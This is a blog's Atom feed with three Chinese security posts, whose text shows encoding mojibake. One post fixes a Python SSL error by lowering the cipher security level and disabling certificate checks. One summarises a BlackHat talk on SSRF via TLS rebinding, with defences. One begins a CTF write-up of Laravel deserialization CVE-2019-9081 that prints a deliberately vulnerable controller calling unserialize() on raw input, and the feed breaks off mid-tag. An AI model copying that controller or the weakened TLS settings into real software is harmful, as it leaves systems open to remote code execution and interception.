<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Z3R0YU</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://zer0yu.github.io/"/>
  <updated>2020-11-19T10:56:46.132Z</updated>
  <id>http://zer0yu.github.io/</id>
  
  <author>
    <name>z3r0yu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>How to fix SSL: UNSUPPORTED_PROTOCOL EEROR in Python</title>
    <link href="http://zer0yu.github.io/2020/11/19/How-to-fix-SSL-UNSUPPORTED-PROTOCOL-EEROR-in-Python/"/>
    <id>http://zer0yu.github.io/2020/11/19/How-to-fix-SSL-UNSUPPORTED-PROTOCOL-EEROR-in-Python/</id>
    <published>2020-11-19T10:55:57.000Z</published>
    <updated>2020-11-19T10:56:46.132Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>ä»Šå¤©è€å¤§é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¯´è®©æˆ‘è§£å†³ä¸€ä¸‹ï¼Œç»“æœé…ç¯å¢ƒ+æœäº†ä¸€ä¸‹åˆä¹Ÿæ²¡ç»™æå®šã€‚æœ€åè¿˜æ˜¯è€å¤§è‡ªå·±ç»™è§£å†³äº†ã€‚WTCLã€‚åœ¨æ­¤è®°å½•ä¸€ä¸‹è¯¥é—®é¢˜</p><h3 id="0x01-é—®é¢˜æè¿°"><a href="#0x01-é—®é¢˜æè¿°" class="headerlink" title="0x01 é—®é¢˜æè¿°"></a>0x01 é—®é¢˜æè¿°</h3><p>æ“ä½œç³»ç»Ÿç¯å¢ƒ<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~$ lsb_release -a</span><br><span class="line">No LSB modules are available.</span><br><span class="line">Distributor ID:Ubuntu</span><br><span class="line">Description:Ubuntu 20.04.1 LTS</span><br><span class="line">Release:20.04</span><br><span class="line">Codename:focal</span><br></pre></td></tr></table></figure></p><p>opensslä¸ºæœ€æ–°ç‰ˆä¸”ç›¸å…³ä¿¡æ¯å¦‚ä¸‹ï¼Œä»ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°æ˜¯æ”¯æŒTLS1/TLS1.1çš„<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop$ openssl s_client -<span class="built_in">help</span> 2&gt;&amp;1  &gt; /dev/null | egrep <span class="string">"\-(ssl|tls)[^a-z]"</span></span><br><span class="line"> -ssl_config val            Use specified configuration file</span><br><span class="line"> -tls1                      Just use TLSv1</span><br><span class="line"> -tls1_1                    Just use TLSv1.1</span><br><span class="line"> -tls1_2                    Just use TLSv1.2</span><br><span class="line"> -tls1_3                    Just use TLSv1.3</span><br><span class="line"> -ssl_client_engine val     Specify engine to be used <span class="keyword">for</span> client certificate operations</span><br></pre></td></tr></table></figure></p><p>è¿™å¥—æœ€æ–°çš„ç¯å¢ƒåœ¨è®¿é—®ä¸€äº›ä¸æ”¯æŒTLS1.2çš„ç½‘ç«™æ—¶å€™ä¼šå‡ºç°ä¸€äº›é—®é¢˜ï¼Œå¦‚æœä½¿ç”¨æµè§ˆå™¨æ‰“å¼€çš„è¯ï¼Œæµè§ˆå™¨ä¼šæç¤ºä½ å¯ç”¨å¯¹ TLS1.0/TLS1.1 çš„æ”¯æŒï¼Œæ­¤æ—¶åªè¦ç‚¹å‡»äº†éšåå°±å®Œå…¨OKã€‚æ‰€ä»¥ä½¿ç”¨headlessçš„è¯éšåå°±ä¸ä¼šé¢å¯¹è¿™ä¸ªé—®é¢˜äº†ã€‚ä½†æ˜¯å¦‚æœä½¿ç”¨Pythonçš„<code>requests</code>åº“çš„è¯ï¼Œå°±ä¼šå‡ºç°ä¸€ä¸‹æŠ¥é”™ä¿¡æ¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zeroyu@ubuntu:~/Desktop$ python3 ssl_error.py </span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/lib/python3/dist-packages/urllib3/contrib/pyopenssl.py"</span>, line 485, <span class="keyword">in</span> wrap_socket</span><br><span class="line">    cnx.do_handshake()</span><br><span class="line">  File <span class="string">"/home/zeroyu/.local/lib/python3.8/site-packages/OpenSSL/SSL.py"</span>, line 1934, <span class="keyword">in</span> do_handshake</span><br><span class="line">    self._raise_ssl_error(self._ssl, result)</span><br><span class="line">  File <span class="string">"/home/zeroyu/.local/lib/python3.8/site-packages/OpenSSL/SSL.py"</span>, line 1671, <span class="keyword">in</span> _raise_ssl_error</span><br><span class="line">    _raise_current_error()</span><br><span class="line">  File <span class="string">"/home/zeroyu/.local/lib/python3.8/site-packages/OpenSSL/_util.py"</span>, line 54, <span class="keyword">in</span> exception_from_error_queue</span><br><span class="line">    raise exception_type(errors)</span><br><span class="line">OpenSSL.SSL.Error: [(<span class="string">'SSL routines'</span>, <span class="string">'ssl_choose_client_version'</span>, <span class="string">'unsupported protocol'</span>)]</span><br></pre></td></tr></table></figure><p>é€ æˆæ­¤é—®é¢˜çš„ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line">req = requests.get(<span class="string">"https://URL"</span>,verify=<span class="literal">False</span>)</span><br><span class="line">print(req.status_code)</span><br></pre></td></tr></table></figure><h3 id="0x02-è§£å†³æ–¹æ¡ˆ"><a href="#0x02-è§£å†³æ–¹æ¡ˆ" class="headerlink" title="0x02 è§£å†³æ–¹æ¡ˆ"></a>0x02 è§£å†³æ–¹æ¡ˆ</h3><p>æ€è·¯æ— éå°±æ˜¯å¯ç”¨å¯¹ä½ç‰ˆæœ¬TLSçš„æ”¯æŒï¼Œå› ä¸ºä»opensslçš„ç›¸å…³ä¿¡æ¯ä¸­å¯ä»¥çœ‹åˆ°æ˜¯å¯¹TLS1.0/TLS1.1 æ”¯æŒçš„ã€‚</p><p>ä½†æ˜¯Stack Overflowè®ºå›ä¸Šçš„ä¼—å¤šå¸–å­å‡ä¸èƒ½å¤Ÿè§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæœ€åè€å¤§ç»™å‡ºçš„è§£å†³æ–¹æ¡ˆæ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS=<span class="string">'DEFAULT:@SECLEVEL=1'</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ‰§è¡Œå¦‚ä¸‹ä»£ç å°±å®Œå…¨æ²¡æœ‰é—®é¢˜äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"><span class="comment">#requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS='DEFAULT:@SECLEVEL=1'</span></span><br><span class="line"></span><br><span class="line">req = requests.get(<span class="string">"https://URL"</span>,verify=<span class="literal">False</span>)</span><br><span class="line">print(req.status_code)</span><br></pre></td></tr></table></figure><h3 id="0x03-ç»“è¯­"><a href="#0x03-ç»“è¯­" class="headerlink" title="0x03 ç»“è¯­"></a>0x03 ç»“è¯­</h3><p>å¦‚æœè¿˜æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæ¬¢è¿è¯„è®º or äº¤æµã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h3&gt;&lt;p&gt;ä»Šå¤©è€å¤§é‡åˆ°äº†ä¸€ä¸ªé—®é¢˜ï¼Œè¯´è®©æˆ‘è§£å†³ä¸€ä¸‹ï¼Œç»“æœé…ç¯å¢ƒ+æœäº†ä¸€ä¸‹åˆä¹Ÿæ²¡ç»™æå®šã€‚æœ€åè¿˜æ˜¯è€å¤§è‡ªå·±ç»™è§£å†³äº†ã€‚
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>When TLS Hacks You -- BlackHat2020</title>
    <link href="http://zer0yu.github.io/2020/08/11/When-TLS-Hacks-You-BlackHat2020/"/>
    <id>http://zer0yu.github.io/2020/08/11/When-TLS-Hacks-You-BlackHat2020/</id>
    <published>2020-08-11T08:23:56.000Z</published>
    <updated>2020-08-11T08:24:44.105Z</updated>
    
    <content type="html"><![CDATA[<h1 id="When-TLS-Hacks-You"><a href="#When-TLS-Hacks-You" class="headerlink" title="When TLS Hacks You"></a>When TLS Hacks You</h1><h3 id="0x00-ç®€ä»‹"><a href="#0x00-ç®€ä»‹" class="headerlink" title="0x00 ç®€ä»‹"></a>0x00 ç®€ä»‹</h3><p>è¿™æ˜¯åœ¨blackhat2020ä¸Šè¿›è¡Œå±•ç¤ºçš„ä¸€ä¸ªå…³äºSSRF+TLS rebindingçš„talkã€‚å…·ä½“æ¥è¯´å°±æ˜¯åˆ©ç”¨TLSä¸­çš„session idæ¥æ‰¿è½½payloadå¯¹å†…ç½‘çš„åº”ç”¨è¿›è¡Œæ”»å‡»ï¼Œå®ƒè¾¾åˆ°çš„ç›®æ ‡è·Ÿä¹‹å‰ @<a href="https://twitter.com/orange_8361" target="_blank" rel="noopener">orangetw</a> è®²è¿°çš„ SNI injection æ–¹æ³•æ˜¯ä¸€æ ·çš„ï¼Œä½†æ˜¯ä¹‹å‰çš„æ–¹æ³•æ˜¯ä¾èµ–äºbugï¼Œè€Œè¿™ç§æ–¹æ³•åˆ™ä¾èµ–äºTLSæœ¬èº«çš„ç‰¹æ€§ã€‚</p><p><a href="https://www.blackhat.com/us-20/briefings/schedule/#when-tls-hacks-you-19446" target="_blank" rel="noopener">æ¼”è®²</a>|<a href="https://github.com/jmdx/TLS-poison/" target="_blank" rel="noopener">å·¥å…·</a></p><h3 id="0x01-ä»€ä¹ˆæ¡ä»¶ä¸‹å¯ä»¥å®ç°è¿™ç§æ”»å‡»ï¼Ÿ"><a href="#0x01-ä»€ä¹ˆæ¡ä»¶ä¸‹å¯ä»¥å®ç°è¿™ç§æ”»å‡»ï¼Ÿ" class="headerlink" title="0x01 ä»€ä¹ˆæ¡ä»¶ä¸‹å¯ä»¥å®ç°è¿™ç§æ”»å‡»ï¼Ÿ"></a>0x01 ä»€ä¹ˆæ¡ä»¶ä¸‹å¯ä»¥å®ç°è¿™ç§æ”»å‡»ï¼Ÿ</h3><p><img src="https://i.loli.net/2020/08/11/uFdryGM9BAEhHZI.png" alt="-w373" style="zoom:50%;"></p><h4 id="1-é¦–å…ˆæ˜¯è¦æœ‰SSRFçš„å¸¸è§æ”»å‡»ç‚¹"><a href="#1-é¦–å…ˆæ˜¯è¦æœ‰SSRFçš„å¸¸è§æ”»å‡»ç‚¹" class="headerlink" title="1. é¦–å…ˆæ˜¯è¦æœ‰SSRFçš„å¸¸è§æ”»å‡»ç‚¹"></a>1. é¦–å…ˆæ˜¯è¦æœ‰SSRFçš„å¸¸è§æ”»å‡»ç‚¹</h4><ul><li>OIDC discovery</li><li>Webpush</li><li>Webmention</li><li>Apple Pay Web</li><li>In browsers, just phishing people (Then we call it CSRF)</li><li>Wificaptive portals</li><li>SSDP</li><li>SVG conversion</li><li>URL-based XXE</li><li>Scraping</li><li>Webhooks</li><li>PDF renderers with images enabled</li></ul><h4 id="2-çœ‹ä»€ä¹ˆä¸œè¥¿ä¼šç¼“å­˜TLS-sessions"><a href="#2-çœ‹ä»€ä¹ˆä¸œè¥¿ä¼šç¼“å­˜TLS-sessions" class="headerlink" title="2.çœ‹ä»€ä¹ˆä¸œè¥¿ä¼šç¼“å­˜TLS sessions"></a>2.çœ‹ä»€ä¹ˆä¸œè¥¿ä¼šç¼“å­˜TLS sessions</h4><p><img src="https://i.loli.net/2020/08/11/onY5MWAPBxuOdjm.png" alt="-w428" style="zoom:67%;"></p><h4 id="3-å†…ç½‘æ½œåœ¨çš„æ”»å‡»å¯¹è±¡æœ‰å“ªäº›"><a href="#3-å†…ç½‘æ½œåœ¨çš„æ”»å‡»å¯¹è±¡æœ‰å“ªäº›" class="headerlink" title="3. å†…ç½‘æ½œåœ¨çš„æ”»å‡»å¯¹è±¡æœ‰å“ªäº›"></a>3. å†…ç½‘æ½œåœ¨çš„æ”»å‡»å¯¹è±¡æœ‰å“ªäº›</h4><p><img src="https://i.loli.net/2020/08/11/D7XPLj1sNcvJlxo.png" alt="-w592" style="zoom:67%;"></p><h3 id="0x02-Real-world-SSRF"><a href="#0x02-Real-world-SSRF" class="headerlink" title="0x02 Real-world SSRF"></a>0x02 Real-world SSRF</h3><ol><li>Youtrack â€“ <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12852" target="_blank" rel="noopener">CVE-2019-12852</a></li><li>Nextcloud</li></ol><blockquote><p>Federated sharing:<br>@<a href="mailto:someone@example.com" target="_blank" rel="noopener">someone@example.com</a><br>@<a href="mailto:someone@example.com" target="_blank" rel="noopener">someone@example.com</a>:11211<br>Use TLS rebinding, write to memcached!<br>Fix: no great options<br>Still added a request timeout and gave me a bounty</p></blockquote><h3 id="0x03-Demo-Phishing-gt-CSRF-gt-RCE"><a href="#0x03-Demo-Phishing-gt-CSRF-gt-RCE" class="headerlink" title="0x03 Demo: Phishing-&gt;CSRF-&gt;RCE"></a>0x03 Demo: Phishing-&gt;CSRF-&gt;RCE</h3><p>è¿™ä¸ªDemoåŸºäºä»¥ä¸‹å‡è®¾ï¼š</p><blockquote><p>å—å®³è€…æ˜¯ä¸€ä¸ªä½¿ç”¨django.core.cacheçš„é¡¹ç›®çš„å¼€å‘è€…ï¼Œå¹¶ä¸”ä½¿ç”¨äº†memcachedã€‚<br>å—å®³è€…åœ¨Chromeç­‰æ˜“å—å½±å“çš„æµè§ˆå™¨ä¸­æµè§ˆç”µå­é‚®ä»¶ã€‚<br>æ”»å‡»è€…çŸ¥é“/çŒœåˆ°è¿™ä¸€ç‚¹ã€‚<br>å—å®³è€…å¾ˆèªæ˜ï¼Œä¸ä¼šä¸‹è½½é™„ä»¶ã€‚</p></blockquote><p>ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š<br><img src="https://i.loli.net/2020/08/11/XhUODkReNsKYq47.png" alt="-w511"></p><p><img src="https://i.loli.net/2020/08/11/O1z8AqQciShx52H.png" alt="-w470"></p><h3 id="0x04-æœªæ¥çš„å·¥ä½œ"><a href="#0x04-æœªæ¥çš„å·¥ä½œ" class="headerlink" title="0x04 æœªæ¥çš„å·¥ä½œ"></a>0x04 æœªæ¥çš„å·¥ä½œ</h3><ul><li>å†…å­˜å´©æºƒé“¾</li><li>NAT pinning</li><li>DOSæ”¾å¤§æ”»å‡»</li><li>æ›´å¥½çš„æµ‹è¯•åŸºç¡€è®¾æ–½</li><li>åœ¨ç‰©è”ç½‘è®¾å¤‡ä¸ŠåŸºäºImageçš„CSRF</li><li>ä½¿ç”¨session ticketæ‰¿è½½payloadæ”»å‡»å†…éƒ¨HTTPæœåŠ¡å™¨</li><li>æ”»å‡»æ¶ˆæ¯é˜Ÿåˆ—</li></ul><h3 id="0x05-é˜²å¾¡æ‰‹æ®µ"><a href="#0x05-é˜²å¾¡æ‰‹æ®µ" class="headerlink" title="0x05 é˜²å¾¡æ‰‹æ®µ"></a>0x05 é˜²å¾¡æ‰‹æ®µ</h3><ol><li>æ”¹å˜ç¼“å­˜çš„key<ul><li>æ¯”å¦‚å½“å‰æ˜¯(hostname,port)ï¼Œå¯ä»¥ä¿®æ”¹ä¸º(hostname,port,ip_addr)</li><li>å¦‚æœä½ å…³å¿ƒå¤§å‹TLSéƒ¨ç½²çš„é—®é¢˜é‚£ä¹ˆå¯ä»¥ä¿®æ”¹ä¸º(hostname,port,addr_type(ip_addr))ï¼Œè¿™æ–¹é¢ä¸<a href="https://wicg.github.io/cors-rfc1918/" target="_blank" rel="noopener">CORS and RFC1918</a>æ¯”è¾ƒç›¸ä¼¼</li></ul></li><li>ç¦ç”¨å‡ºç«™TLS session resumption<ul><li>libcurl: CURLOPT_SSL_SESSIONID_CACHE=false</li><li>firefox: security.ssl.disable_session_identifiers=true</li><li>Tor browser: disabled by default</li><li>Java, Nodejs, Chrome, others: no option</li></ul></li><li>web appæ˜¯æ²¡æœ‰åŠæ³•ç¦æ­¢å‡ºç«™TLS session resumptionçš„ï¼Œæ‰€ä»¥åªèƒ½ï¼š<ul><li>ç‰¹åˆ«ç•™æ„ä¸€ä¸‹ webhooks, apple pay</li><li>å¯¹å‡ºç«™è¯·æ±‚è®¾ç½®ä»£ç†ï¼Œä¾‹å¦‚ä½¿ç”¨<a href="https://github.com/stripe/smokescreen" target="_blank" rel="noopener">smokescreen</a></li><li>é¿å…è¿è¡Œæœªç»èº«ä»½éªŒè¯çš„å†…éƒ¨TCPå†…å®¹ï¼Œç‰¹åˆ«æ˜¯åœ¨ä½¿ç”¨æ¢è¡Œåˆ†éš”ç¬¦æ—¶</li></ul></li></ol><h3 id="0x06-æ€»ç»“"><a href="#0x06-æ€»ç»“" class="headerlink" title="0x06 æ€»ç»“"></a>0x06 æ€»ç»“</h3><ol><li>TLSå¯¹SSRFæ”»å‡»æ˜¯ååˆ†æœ‰æ•ˆçš„</li><li>éµå¾ªæœ€æ–°çš„è§„æ ¼æ˜¯æ‰“ç ´å¸¸è§„çš„å¥½æ–¹æ³•</li><li>æˆ‘ä»¬éœ€è¦é‡æ–°è€ƒè™‘TLS session resumptionçš„ä¼˜ç‚¹<br>PS: æœ¬æ–‡æ˜¯å¯¹è®®é¢˜åšäº†ä¸€ä¸ªç®€å•çš„ç®€è¿°ï¼Œå¦‚æœæœ‰è¯¯è¿˜è¯·æŒ‡æ­£</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;When-TLS-Hacks-You&quot;&gt;&lt;a href=&quot;#When-TLS-Hacks-You&quot; class=&quot;headerlink&quot; title=&quot;When TLS Hacks You&quot;&gt;&lt;/a&gt;When TLS Hacks You&lt;/h1&gt;&lt;h3 id=&quot;0
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Laravel 5.7ååºåˆ—åŒ–æ¼æ´(CVE-2019-9081+2020ç¬¬äº”ç©ºé—´é¢˜è§£)</title>
    <link href="http://zer0yu.github.io/2020/06/28/Laravel-5-7%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2019-9081-2020%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%A2%98%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2020/06/28/Laravel-5-7ååºåˆ—åŒ–æ¼æ´-CVE-2019-9081-2020ç¬¬äº”ç©ºé—´é¢˜è§£/</id>
    <published>2020-06-28T00:18:36.000Z</published>
    <updated>2020-06-28T00:19:48.431Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>å‰å¤©ç¬¬äº”ç©ºé—´çš„æ—¶å€™5am3é—®æˆ‘è¿˜ä¼šæLaravelä¸ã€‚åŠå¹´æ²¡æ‰“CTFäº†ï¼ŒçœŸçš„æ˜¯æ·¡å¿˜äº†å¾ˆå¤šï¼Œå†åŠ ä¸Šå½“æ—¶ç‰™ç–¼åˆ°çœ‹ç€ä»£ç å‘è’™ï¼Œæ‰€ä»¥é¢˜ç›®ä¸­çš„é“¾å°±ç»™é”™è¿‡äº†ã€‚æ¯”èµ›ä¹‹åå¤ä¹ äº†ä¸€ä¸‹ç¬”è®°ğŸ“’ã€‚æ•´åˆäº†å…¶å®ƒç¬”è®°çš„å†…å®¹ï¼Œå½¢æˆäº†è¿™ç¯‡æ–‡ç« ã€‚<br>PS: ååºåˆ—åŒ–æ¼æ´POPé“¾æ˜¯æˆ‘å½“æ—¶æœ€å–œæ¬¢æå¾—ï¼Œæ²¡æƒ³åˆ°è¿™çŸ¥è¯†å¿˜å¾—çœŸçš„å¿«å•Šã€‚</p><h3 id="0x01-åˆ¤æ–­é¢˜ç›®ç¯å¢ƒçš„ç‰ˆæœ¬"><a href="#0x01-åˆ¤æ–­é¢˜ç›®ç¯å¢ƒçš„ç‰ˆæœ¬" class="headerlink" title="0x01 åˆ¤æ–­é¢˜ç›®ç¯å¢ƒçš„ç‰ˆæœ¬"></a>0x01 åˆ¤æ–­é¢˜ç›®ç¯å¢ƒçš„ç‰ˆæœ¬</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â¯ php artisan</span><br><span class="line">Laravel Framework 5.7.28</span><br></pre></td></tr></table></figure><h3 id="0x02-è®¾ç½®å¯¹åº”çš„å…¥å£ç‚¹"><a href="#0x02-è®¾ç½®å¯¹åº”çš„å…¥å£ç‚¹" class="headerlink" title="0x02 è®¾ç½®å¯¹åº”çš„å…¥å£ç‚¹"></a>0x02 è®¾ç½®å¯¹åº”çš„å…¥å£ç‚¹</h3><p>å…¥å£URL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php/index?p=</span><br></pre></td></tr></table></figure></p><p>ä¸å…¥å£ç‚¹ç›¸å…³çš„æ–‡ä»¶ï¼š</p><ol><li><p>è·¯ç”±æ–‡ä»¶ <code>routes/web.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Route::get(<span class="string">'/index'</span>, <span class="string">'TaskController@index'</span>);</span><br></pre></td></tr></table></figure></li><li><p>ååºåˆ—åŒ–çš„å…¥å£ç‚¹ <code>app/Http/Controllers/TaskController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'p'</span>]))&#123;</span><br><span class="line"> unserialize($_GET[<span class="string">'p'</span>]);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">"There is an param names p (get)"</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="0x03-æœ¬åœ°ç¯å¢ƒæ­å»º"><a href="#0x03-æœ¬åœ°ç¯å¢ƒæ­å»º" class="headerlink" title="0x03 æœ¬åœ°ç¯å¢ƒæ­å»º"></a>0x03 æœ¬åœ°ç¯å¢ƒæ­å»º</h3><p>ä¸¤ç§ç¯å¢ƒæ­å»ºæ–¹æ¡ˆ</p><h4 id="A-æœ¬åœ°ç¯å¢ƒé…ç½®"><a href="#A-æœ¬åœ°ç¯å¢ƒé…ç½®" class="headerlink" title="A.æœ¬åœ°ç¯å¢ƒé…ç½®"></a>A.æœ¬åœ°ç¯å¢ƒé…ç½®</h4><p>æ“ä½œç³»ç»Ÿï¼šmacOS<br>PHPç‰ˆæœ¬ï¼š7.3.11<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">composer create-project laravel/laravel laravel57mac &quot;5.7.*&quot;</span><br><span class="line">cd laravel57mac</span><br><span class="line">php artisan serve --host=0.0.0.0 --port 8081</span><br></pre></td></tr></table></figure></p><h4 id="B-è™šæ‹Ÿæœºç¯å¢ƒé…ç½®"><a href="#B-è™šæ‹Ÿæœºç¯å¢ƒé…ç½®" class="headerlink" title="B.è™šæ‹Ÿæœºç¯å¢ƒé…ç½®"></a>B.è™šæ‹Ÿæœºç¯å¢ƒé…ç½®</h4><p>å…·ä½“çš„ç¯å¢ƒé…ç½®è¿‡ç¨‹å‚è€ƒï¼š<a href="https://learnku.com/docs/laravel-development-environment/7.x/development-environment-macos/8443" target="_blank" rel="noopener">å®˜æ–¹é“¾æ¥</a><br>è™šæ‹Ÿç¯å¢ƒçš„æ“ä½œï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># è™šæ‹Ÿæœºçš„å¯åŠ¨</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant up</span><br><span class="line"># sshç™»å½•è™šæ‹Ÿæœº</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant ssh</span><br><span class="line"># sshä¸Šå»ä¹‹åå¯ä»¥ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤é€€å‡º</span><br><span class="line">exit</span><br><span class="line"># å…³é—­ Homestead</span><br><span class="line">vagrant halt</span><br><span class="line"># è™šæ‹Ÿæœºåˆ é™¤</span><br><span class="line">vagrant destroy --force</span><br><span class="line"># ä¿®æ”¹Homestead.yamlé…ç½®æ–‡ä»¶é‡æ–°åŠ è½½</span><br><span class="line">cd ~/Homestead &amp;&amp; vagrant up # å¦‚æœè™šæ‹Ÿæœºæ˜¯å¼€å¯çš„åˆ™ä¸éœ€è¦æ‰§è¡Œè¿™ä¸ªå‘½ä»¤</span><br><span class="line">vagrant provision</span><br></pre></td></tr></table></figure></p><p>xdebugè¿œç¨‹è°ƒè¯•<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#å¼€å¯xdebug</span><br><span class="line">sudo phpenmod xdebug</span><br><span class="line">#å…³é—­xdebug</span><br><span class="line">sudo phpdismod xdebug</span><br><span class="line">#å®¢æˆ·ç«¯è°ƒè¯•è„šæœ¬</span><br><span class="line">xphp path/to/script</span><br><span class="line">#xdebugçš„é…ç½®æ–‡ä»¶ä¿®æ”¹</span><br><span class="line">/etc/php/7.#/fpm/conf.d/20-xdebug.ini</span><br></pre></td></tr></table></figure></p><p>webæœåŠ¡å™¨åˆ‡æ¢(ngnixå’Œapache)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flip</span><br></pre></td></tr></table></figure></p><h3 id="0x04-CVE-2019-9081"><a href="#0x04-CVE-2019-9081" class="headerlink" title="0x04 CVE-2019-9081"></a>0x04 CVE-2019-9081</h3><p>å½±å“ç‰ˆæœ¬ï¼šLaravel v5.7<br>æ¼æ´æ ¸å¿ƒï¼š<code>Illuminate/Foundation/Testing/PendingCommand</code>ç±»ä¸­çš„<code>__destruct</code>æ–¹æ³•ä¸­è°ƒç”¨äº†<code>run</code>æ–¹æ³•ï¼Œè€Œ<code>run</code>æ–¹æ³•æ˜¯ç”¨æ¥<code>Execute the command</code>çš„ã€‚å› æ­¤éœ€è¦æ‰¾åˆ°å¯¹åº”çš„POPé“¾æ¥å®ŒæˆRCEã€‚<br>é¦–å…ˆçœ‹ä¸€ä¸‹<code>PendingCommand</code>ç±»ä¸­çš„å‡ ä¸ªé‡è¦å±æ€§ï¼š<br><img src="https://i.loli.net/2020/06/28/Z4j59vhtFQDcy3U.png" 